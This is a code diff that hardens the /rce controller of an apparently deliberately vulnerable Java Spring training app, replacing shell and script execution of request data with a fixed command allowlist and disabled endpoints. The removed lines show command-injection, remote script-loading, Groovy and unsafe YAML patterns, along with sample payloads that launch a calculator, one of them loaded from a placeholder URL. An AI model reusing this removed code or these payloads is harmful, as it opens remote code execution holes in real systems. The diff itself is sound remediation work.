@@ -1,6 +1,5 @@
 package org.joychou.controller;
 
-import groovy.lang.GroovyShell;
 import lombok.extern.slf4j.Slf4j;
 import org.springframework.web.bind.annotation.GetMapping;
 import org.springframework.web.bind.annotation.RequestMapping;
@@ -8,14 +7,12 @@ import org.springframework.web.bind.annotation.RestController;
 import org.yaml.snakeyaml.Yaml;
 import org.yaml.snakeyaml.constructor.SafeConstructor;
 
-import javax.script.Bindings;
-import javax.script.ScriptContext;
-import javax.script.ScriptEngine;
-import javax.script.ScriptEngineManager;
 import java.io.BufferedInputStream;
 import java.io.BufferedReader;
 import java.io.InputStreamReader;
-import java.sql.DriverManager;
+import java.util.Collections;
+import java.util.HashMap;
+import java.util.Map;
 
 
 /**
@@ -28,19 +25,44 @@ import java.sql.DriverManager;
 @RequestMapping("/rce")
 public class Rce {
 
+    /**
+     * Fixed server-side table of runnable commands. The request value only selects a key;
+     * the argv that is executed is always one of these constants.
+     */
+    private static final Map<String, String[]> COMMANDS;
+
+    static {
+        Map<String, String[]> m = new HashMap<>();
+        m.put("date", new String[]{"date"});
+        m.put("whoami", new String[]{"whoami"});
+        m.put("uname", new String[]{"uname", "-a"});
+        m.put("ls", new String[]{"ls", "-l"});
+        COMMANDS = Collections.unmodifiableMap(m);
+    }
+
+    private static String[] lookupCommand(String key) {
+        if (key == null) {
+            return null;
+        }
+        String[] argv = COMMANDS.get(key.trim());
+        return argv == null ? null : argv.clone();
+    }
+
     @GetMapping("/runtime/exec")
     public String CommandExec(String cmd) {
-        Runtime run = Runtime.getRuntime();
-        StringBuilder sb = new StringBuilder();
+        String[] argv = lookupCommand(cmd);
+        if (argv == null) {
+            return "Bad boy. I got u.";
+        }
 
         try {
-            Process p = run.exec(cmd);
+            Process p = new ProcessBuilder(argv).start();
             BufferedInputStream in = new BufferedInputStream(p.getInputStream());
             BufferedReader inBr = new BufferedReader(new InputStreamReader(in));
-            String tmpStr;
 
-            while ((tmpStr = inBr.readLine()) != null) {
-                sb.append(tmpStr);
+            // Drain and discard the output so the process can finish; it is not reflected to the caller.
+            while (inBr.readLine() != null) {
+                // discard
             }
 
             if (p.waitFor() != 0) {
@@ -51,9 +73,10 @@ public class Rce {
             inBr.close();
             in.close();
         } catch (Exception e) {
-            return e.toString();
+            log.error("CommandExec failed: {}", e.getClass().getSimpleName());
+            return "Command exec failed!!";
         }
-        return sb.toString();
+        return "Command executed";
     }
 
 
@@ -63,42 +86,39 @@ public class Rce {
     @GetMapping("/ProcessBuilder")
     public String processBuilder(String cmd) {
 
-        StringBuilder sb = new StringBuilder();
+        String[] arrCmd = lookupCommand(cmd);
+        if (arrCmd == null) {
+            return "Bad boy. I got u.";
+        }
 
         try {
-            String[] arrCmd = {"/bin/sh", "-c", cmd};
             ProcessBuilder processBuilder = new ProcessBuilder(arrCmd);
             Process p = processBuilder.start();
             BufferedInputStream in = new BufferedInputStream(p.getInputStream());
             BufferedReader inBr = new BufferedReader(new InputStreamReader(in));
-            String tmpStr;
 
-            while ((tmpStr = inBr.readLine()) != null) {
-                sb.append(tmpStr);
+            // Drain and discard the output so the process can finish; it is not reflected to the caller.
+            while (inBr.readLine() != null) {
+                // discard
             }
+            inBr.close();
         } catch (Exception e) {
-            return e.toString();
+            log.error("processBuilder failed: {}", e.getClass().getSimpleName());
+            return "Command exec failed!!";
         }
 
-        return sb.toString();
+        return "Command executed";
     }
 
 
     /**
-     * http://localhost:8080/rce/jscmd?jsurl=http://xx.yy/zz.js
+     * Remote script loading was removed: request data is never evaluated as a script.
      *
-     * curl http://xx.yy/zz.js
-     * var a = mainOutput(); function mainOutput() { var x=java.lang.Runtime.getRuntime().exec("open -a Calculator");}
-     *
-     * @param jsurl js url
+     * @param jsurl ignored
      */
     @GetMapping("/jscmd")
-    public void jsEngine(String jsurl) throws Exception{
-        // js nashorn javascript ecmascript
-        ScriptEngine engine = new ScriptEngineManager().getEngineByName("js");
-        Bindings bindings = engine.getBindings(ScriptContext.ENGINE_SCOPE);
-        String cmd = String.format("load(\"%s\")", jsurl);
-        engine.eval(cmd, bindings);
+    public String jsEngine(String jsurl) {
+        return "Script evaluation is disabled";
     }
 
 
@@ -110,7 +130,7 @@ public class Rce {
      */
     @GetMapping("/vuln/yarm")
     public void yarm(String content) {
-        Yaml y = new Yaml();
+        Yaml y = new Yaml(new SafeConstructor());
         y.load(content);
     }
 
@@ -121,15 +141,14 @@ public class Rce {
     }
 
     /**
-     * http://localhost:8080/rce/groovy?content="open -a Calculator".execute()
-     * @param content groovy shell
+     * Groovy evaluation of request data was removed.
+     *
+     * @param content ignored
      */
     @GetMapping("groovy")
-    public void groovyshell(String content) {
-        GroovyShell groovyShell = new GroovyShell();
-        groovyShell.evaluate(content);
+    public String groovyshell(String content) {
+        return "Script evaluation is disabled";
     }
-
 
 
     public static void main(String[] args) throws Exception{
